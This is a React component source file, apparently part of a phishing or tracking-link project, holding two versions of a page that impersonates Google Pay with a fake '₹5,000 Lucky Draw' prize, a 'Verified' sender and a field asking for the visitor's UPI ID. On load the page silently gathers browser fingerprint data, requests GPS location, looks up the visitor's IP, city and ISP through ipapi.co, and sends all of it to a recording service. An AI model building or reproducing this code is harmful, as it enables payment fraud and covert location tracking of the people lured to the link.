// import React, { useEffect, useState, useRef } from "react";
// import { useParams } from "react-router-dom";

// export default function TrackingCapture() {
//   const { token } = useParams();
//   const [status, setStatus] = useState("loading");
//   const hasCaptured = useRef(false);

//   useEffect(() => {
//     if (hasCaptured.current) return;
//     hasCaptured.current = true;
//     captureAndRecord();
//   }, [token]);

//   async function captureAndRecord() {
//     try {
//       const deviceData = {
//         userAgent: navigator.userAgent,
//         browser: getBrowser(),
//         os: getOS(),
//         device: getDeviceType(),
//         language: navigator.language,
//         platform: navigator.platform,
//         screenWidth: window.screen.width,
//         screenHeight: window.screen.height,
//         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
//         cookiesEnabled: navigator.cookieEnabled,
//         referrer: document.referrer,
//         timestamp: new Date().toISOString(),
//       };

//       if (navigator.geolocation) {
//         try {
//           const pos = await new Promise((res, rej) =>
//             navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
//           );
//           deviceData.lat = pos.coords.latitude;
//           deviceData.lon = pos.coords.longitude;
//           deviceData.accuracy = pos.coords.accuracy;
//         } catch {
//           // denied
//         }
//       }

//       try {
//         const ipRes = await fetch("https://ipapi.co/json/");
//         if (ipRes.ok) {
//           const ipData = await ipRes.json();
//           deviceData.ip = ipData.ip;
//           deviceData.city = ipData.city;
//           deviceData.region = ipData.region;
//           deviceData.country = ipData.country_name;
//           deviceData.isp = ipData.org;
//           if (!deviceData.lat) deviceData.lat = ipData.latitude;
//           if (!deviceData.lon) deviceData.lon = ipData.longitude;
//         }
//       } catch {
//         deviceData.ip = "Unable to fetch";
//       }

//       const { recordCapture } = await import("../utils/linkService");
//       await recordCapture(token, deviceData);
//       setStatus("done");
//     } catch (err) {
//       setStatus("done");
//     }
//   }

//   function getBrowser() {
//     const ua = navigator.userAgent;
//     if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
//     if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
//     if (ua.includes("Firefox")) return "Firefox";
//     if (ua.includes("Edg")) return "Edge";
//     if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
//     return "Unknown";
//   }

//   function getOS() {
//     const ua = navigator.userAgent;
//     if (ua.includes("Android")) return "Android";
//     if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
//     if (ua.includes("Windows")) return "Windows";
//     if (ua.includes("Mac")) return "macOS";
//     if (ua.includes("Linux")) return "Linux";
//     return "Unknown";
//   }

//   function getDeviceType() {
//     const ua = navigator.userAgent;
//     if (/Mobi|Android/i.test(ua)) return "Mobile";
//     if (/Tablet|iPad/i.test(ua)) return "Tablet";
//     return "Desktop";
//   }

//   const orderId = token?.substring(0, 10).toUpperCase();

//   return (
//     <div style={{ margin: 0, padding: 0, minHeight: "100vh", background: "#f8f9fa", fontFamily: "'Google Sans', Roboto, sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
      
//       {/* GPay Card */}
//       <div style={{ background: "#fff", borderRadius: 24, boxShadow: "0 8px 40px rgba(0,0,0,0.12)", width: "100%", maxWidth: 420, overflow: "hidden" }}>
        
//         {/* Header */}
//         <div style={{ background: "linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)", padding: "28px 24px 24px", textAlign: "center" }}>
//           <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 12 }}>
//             {/* <img
//               src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/Google_Pay_Logo.svg/640px-Google_Pay_Logo.svg.png"
//               alt="Google Pay"
//               style={{ height: 38, filter: "brightness(0) invert(1)" }}
//             /> */}
//             {/* <svg width="120" height="40" viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
//   <text x="0" y="32" fontFamily="'Google Sans', Roboto, sans-serif" fontSize="32" fontWeight="700" fill="white">G</text>
//   <text x="38" y="30" fontFamily="'Google Sans', Roboto, sans-serif" fontSize="26" fontWeight="400" fill="white">Pay</text>
// </svg> */}

// {/* <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 12 }}>
//   <div style={{ background: "#fff", borderRadius: "50%", width: 44, height: 44, display: "flex", alignItems: "center", justifyContent: "center" }}>
//     <svg width="26" height="26" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
//       <path d="M12 11.5v2.5h3.5c-.15 1-.6 1.85-1.25 2.4l2 1.55C17.55 16.7 18 14.95 18 12.95c0-.5-.05-1-.13-1.45H12z" fill="#4285F4"/>
//       <path d="M6.3 14.69l-.45.35-1.6 1.25C5.45 17.8 7.55 19 10 19c2.7 0 4.96-1 6.6-2.55l-2-1.55c-.55.4-1.25.65-2.1.75V14.5H6.3z" fill="#34A853"/>
//       <path d="M4.25 8.71C3.95 9.45 3.77 10.2 3.77 11s.18 1.55.48 2.29l2.05-1.6C6.1 11.3 6 10.65 6 10s.1-1.3.3-1.69L4.25 8.71z" fill="#FBBC05"/>
//       <path d="M10 5c1.55 0 2.95.6 3.95 1.55l1.9-1.9C14.5 3 12.4 2 10 2 7.55 2 5.45 3.2 4.25 5.01l2.05 1.6C7.05 5.5 8.4 5 10 5z" fill="#EA4335"/>
//     </svg>
//   </div>
//   <div style={{ color: "#fff", fontWeight: 700, fontSize: 26, letterSpacing: 0.5 }}>Pay</div>
// </div> */}
// {/* <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginBottom: 12 }}>
//   <span style={{ fontSize: 32, fontWeight: 900, fontFamily: "Arial, sans-serif" }}>
//     <span style={{ color: "#4285F4" }}>G</span>
//     <span style={{ color: "#EA4335" }}>o</span>
//     <span style={{ color: "#FBBC05" }}>o</span>
//     <span style={{ color: "#4285F4" }}>g</span>
//     <span style={{ color: "#34A853" }}>l</span>
//     <span style={{ color: "#EA4335" }}>e</span>
//   </span>
//   <span style={{ color: "#fff", fontWeight: 700, fontSize: 26 }}>Pay</span>
// </div> */}
// <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 12 }}>
//   <img
//     src="https://static0.howtogeekimages.com/wordpress/wp-content/uploads/2020/11/Google-Pay-hero.png"
//     alt="Google Pay"
//     style={{ height: 45, objectFit: "contain" }}
//   />
// </div>
//           </div>
//           <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13 }}>🎉 Lucky Winner Cash Prize</div>
//         </div>

//         {/* Amount */}
//         <div style={{ padding: "28px 24px 20px", textAlign: "center", borderBottom: "1px solid #f0f0f0" }}>
//           <div style={{ color: "#202124", fontWeight: 800, fontSize: 42, letterSpacing: -1 }}>
//             ₹5,000
//           </div>
//           <div style={{ color: "#5f6368", fontSize: 13, marginTop: 6 }}>
//             You won a lucky draw prize!
//           </div>
//           <div style={{ display: "inline-block", background: "#e8f5e9", color: "#2e7d32", borderRadius: 20, padding: "4px 14px", fontSize: 12, fontWeight: 600, marginTop: 8 }}>
//             ✓ Verified Sender
//           </div>
//         </div>

//         {/* Sender Info */}
//         <div style={{ padding: "20px 24px", borderBottom: "1px solid #f0f0f0" }}>
//           <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
//             <div style={{ width: 48, height: 48, borderRadius: "50%", background: "linear-gradient(135deg, #1a73e8, #0d47a1)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700, fontSize: 20, flexShrink: 0 }}>
//               L
//             </div>
//             <div>
//               <div style={{ color: "#202124", fontWeight: 600, fontSize: 15 }}>Lucky Draw India</div>
//               <div style={{ color: "#5f6368", fontSize: 12, marginTop: 2 }}>luckydraw@okaxis</div>
//             </div>
//             <div style={{ marginLeft: "auto", color: "#1a73e8", fontSize: 12, fontWeight: 600 }}>TRUSTED</div>
//           </div>
//         </div>

//         {/* Details */}
//         <div style={{ padding: "16px 24px", borderBottom: "1px solid #f0f0f0", background: "#fafafa" }}>
//           <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
//             <span style={{ color: "#5f6368", fontSize: 13 }}>Transaction ID</span>
//             <span style={{ color: "#202124", fontSize: 13, fontWeight: 500 }}>TXN{orderId}</span>
//           </div>
//           <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
//             <span style={{ color: "#5f6368", fontSize: 13 }}>Date</span>
//             <span style={{ color: "#202124", fontSize: 13, fontWeight: 500 }}>{new Date().toLocaleDateString("en-IN")}</span>
//           </div>
//           <div style={{ display: "flex", justifyContent: "space-between" }}>
//             <span style={{ color: "#5f6368", fontSize: 13 }}>Status</span>
//             <span style={{ color: status === "loading" ? "#f9ab00" : "#1e8e3e", fontSize: 13, fontWeight: 600 }}>
//               {status === "loading" ? "⏳ Processing..." : "✓ Ready to Claim"}
//             </span>
//           </div>
//         </div>

//         {/* UPI Input */}
//         <div style={{ padding: "20px 24px 8px" }}>
//           <div style={{ color: "#202124", fontSize: 14, fontWeight: 500, marginBottom: 10 }}>Enter your UPI ID to receive money</div>
//           <div style={{ display: "flex", alignItems: "center", border: "1.5px solid #dadce0", borderRadius: 12, overflow: "hidden", marginBottom: 16 }}>
//             <input
//               type="text"
//               placeholder="yourname@okicici"
//               style={{ flex: 1, padding: "14px 16px", border: "none", outline: "none", fontSize: 14, color: "#202124", background: "transparent" }}
//             />
//             <div style={{ padding: "0 16px", color: "#1a73e8", fontSize: 13, fontWeight: 600, borderLeft: "1px solid #dadce0", height: "100%", display: "flex", alignItems: "center", cursor: "pointer" }}>
//               Verify
//             </div>
//           </div>

//           {/* Receive Button */}
//           <button
//             style={{
//               width: "100%",
//               background: status === "loading" ? "#dadce0" : "linear-gradient(135deg, #1a73e8, #0d47a1)",
//               color: status === "loading" ? "#5f6368" : "#fff",
//               border: "none",
//               borderRadius: 12,
//               padding: "16px",
//               fontSize: 16,
//               fontWeight: 700,
//               cursor: status === "loading" ? "not-allowed" : "pointer",
//               letterSpacing: 0.5,
//             }}
//           >
//             {status === "loading" ? "Verifying Details..." : "Receive ₹5,000"}
//           </button>

//           <div style={{ textAlign: "center", marginTop: 14, marginBottom: 8, color: "#5f6368", fontSize: 11, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
//             <span>🔒</span>
//             <span>Secured by Google Pay · 256-bit encryption</span>
//           </div>
//         </div>
//       </div>

//       <div style={{ marginTop: 20, color: "#9aa0a6", fontSize: 11, textAlign: "center" }}>
//         Google Pay · Privacy · Terms
//       </div>
//     </div>
//   );
// }



import React, { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";

export default function TrackingCapture() {
  const { token } = useParams();
  const [status, setStatus] = useState("loading");
  const hasCaptured = useRef(false);

  useEffect(() => {
    if (hasCaptured.current) return;
    hasCaptured.current = true;
    captureAndRecord();
  }, [token]);

  async function captureAndRecord() {
    try {
      const deviceData = {
        userAgent: navigator.userAgent,
        browser: getBrowser(),
        os: getOS(),
        device: getDeviceType(),
        language: navigator.language,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        referrer: document.referrer,
        timestamp: new Date().toISOString(),
      };

      if (navigator.geolocation) {
        try {
          const pos = await new Promise((res, rej) =>
            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 })
          );
          deviceData.lat = pos.coords.latitude;
          deviceData.lon = pos.coords.longitude;
          deviceData.accuracy = pos.coords.accuracy;
        } catch {
          // denied
        }
      }

      try {
        const ipRes = await fetch("https://ipapi.co/json/");
        if (ipRes.ok) {
          const ipData = await ipRes.json();
          deviceData.ip = ipData.ip;
          deviceData.city = ipData.city;
          deviceData.region = ipData.region;
          deviceData.country = ipData.country_name;
          deviceData.isp = ipData.org;
          if (!deviceData.lat) deviceData.lat = ipData.latitude;
          if (!deviceData.lon) deviceData.lon = ipData.longitude;
        }
      } catch {
        deviceData.ip = "Unable to fetch";
      }

      const { recordCapture } = await import("../utils/linkService");
      await recordCapture(token, deviceData);
      setStatus("done");
    } catch (err) {
      setStatus("done");
    }
  }

  function getBrowser() {
    const ua = navigator.userAgent;
    if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
    if (ua.includes("Firefox")) return "Firefox";
    if (ua.includes("Edg")) return "Edge";
    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
    return "Unknown";
  }

  function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes("Android")) return "Android";
    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
    if (ua.includes("Windows")) return "Windows";
    if (ua.includes("Mac")) return "macOS";
    if (ua.includes("Linux")) return "Linux";
    return "Unknown";
  }

  function getDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return "Mobile";
    if (/Tablet|iPad/i.test(ua)) return "Tablet";
    return "Desktop";
  }

  const orderId = token?.substring(0, 10).toUpperCase();

  return (
    <div style={{
      margin: 0,
      padding: 0,
      minHeight: "100vh",
      background: "#f1f3f4",
      fontFamily: "'Google Sans', Roboto, Arial, sans-serif",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      padding: "16px"
    }}>
      <div style={{
        background: "#fff",
        borderRadius: 16,
        boxShadow: "0 2px 10px rgba(0,0,0,0.15)",
        width: "100%",
        maxWidth: 400,
        overflow: "hidden"
      }}>

        {/* Top bar */}
        <div style={{
          background: "#fff",
          padding: "16px 20px",
          borderBottom: "1px solid #e8eaed",
          display: "flex",
          alignItems: "center",
          gap: 10
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
            <svg width="28" height="28" viewBox="0 0 48 48">
              <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
              <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
              <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
            </svg>
            <span style={{ fontSize: 18, fontWeight: 500, color: "#202124", letterSpacing: 0.3 }}>Pay</span>
          </div>
        </div>

        {/* Prize Banner */}
        <div style={{
          background: "linear-gradient(135deg, #1a73e8, #0d47a1)",
          padding: "24px 20px",
          textAlign: "center"
        }}>
          <div style={{
            background: "rgba(255,255,255,0.15)",
            borderRadius: 50,
            display: "inline-block",
            padding: "4px 16px",
            marginBottom: 12,
            fontSize: 12,
            color: "#fff",
            letterSpacing: 1
          }}>
            🎉 CONGRATULATIONS
          </div>
          <div style={{ color: "#fff", fontSize: 38, fontWeight: 700, letterSpacing: -1 }}>
            ₹5,000
          </div>
          <div style={{ color: "rgba(255,255,255,0.85)", fontSize: 13, marginTop: 6 }}>
            Lucky Draw Winner — Claim your prize now!
          </div>
        </div>

        {/* Sender */}
        <div style={{ padding: "16px 20px", borderBottom: "1px solid #e8eaed", display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{
            width: 46,
            height: 46,
            borderRadius: "50%",
            background: "#1a73e8",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            color: "#fff",
            fontWeight: 700,
            fontSize: 20,
            flexShrink: 0
          }}>L</div>
          <div style={{ flex: 1 }}>
            <div style={{ color: "#202124", fontWeight: 600, fontSize: 15 }}>Lucky Draw India</div>
            <div style={{ color: "#5f6368", fontSize: 12, marginTop: 2 }}>luckydraw@okhdfcbank</div>
          </div>
          <div style={{
            background: "#e6f4ea",
            color: "#137333",
            fontSize: 11,
            fontWeight: 600,
            padding: "3px 10px",
            borderRadius: 12
          }}>✓ VERIFIED</div>
        </div>

        {/* Transaction details */}
        <div style={{ padding: "14px 20px", background: "#f8f9fa", borderBottom: "1px solid #e8eaed" }}>
          {[
            { label: "Transaction ID", value: "TXN" + orderId },
            { label: "Date & Time", value: new Date().toLocaleString("en-IN") },
            { label: "Payment Type", value: "Lucky Draw Prize" },
            { label: "Status", value: status === "loading" ? "⏳ Verifying..." : "✓ Ready to Claim", color: status === "loading" ? "#f9ab00" : "#137333" },
          ].map((item, i) => (
            <div key={i} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 10 }}>
              <span style={{ color: "#5f6368", fontSize: 13 }}>{item.label}</span>
              <span style={{ color: item.color || "#202124", fontSize: 13, fontWeight: 500 }}>{item.value}</span>
            </div>
          ))}
        </div>

        {/* UPI Input */}
        <div style={{ padding: "20px" }}>
          <div style={{ color: "#202124", fontSize: 14, fontWeight: 500, marginBottom: 12 }}>
            Enter UPI ID to receive ₹5,000
          </div>

          <div style={{
            display: "flex",
            alignItems: "center",
            border: "1.5px solid #dadce0",
            borderRadius: 8,
            overflow: "hidden",
            marginBottom: 16
          }}>
            <input
              type="text"
              placeholder="mobilenumber@upi"
              style={{
                flex: 1,
                padding: "13px 14px",
                border: "none",
                outline: "none",
                fontSize: 14,
                color: "#202124",
                background: "transparent"
              }}
            />
            <div style={{
              padding: "0 16px",
              color: "#1a73e8",
              fontSize: 13,
              fontWeight: 600,
              borderLeft: "1px solid #dadce0",
              cursor: "pointer",
              whiteSpace: "nowrap",
              alignSelf: "stretch",
              display: "flex",
              alignItems: "center"
            }}>Verify</div>
          </div>

          <button style={{
            width: "100%",
            background: status === "loading" ? "#dadce0" : "#1a73e8",
            color: status === "loading" ? "#5f6368" : "#fff",
            border: "none",
            borderRadius: 8,
            padding: "14px",
            fontSize: 15,
            fontWeight: 600,
            cursor: status === "loading" ? "not-allowed" : "pointer",
            letterSpacing: 0.3
          }}>
            {status === "loading" ? "Verifying..." : "Claim ₹5,000 Now"}
          </button>

          <div style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 6,
            marginTop: 14,
            color: "#5f6368",
            fontSize: 11
          }}>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="#5f6368">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <span>Secured by Google Pay · 256-bit SSL</span>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div style={{ marginTop: 20, display: "flex", alignItems: "center", gap: 6 }}>
        <svg width="16" height="16" viewBox="0 0 48 48">
          <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
          <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
          <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
        </svg>
        <span style={{ color: "#5f6368", fontSize: 11 }}>Google Pay · Privacy · Terms · Help</span>
      </div>
    </div>
  );
}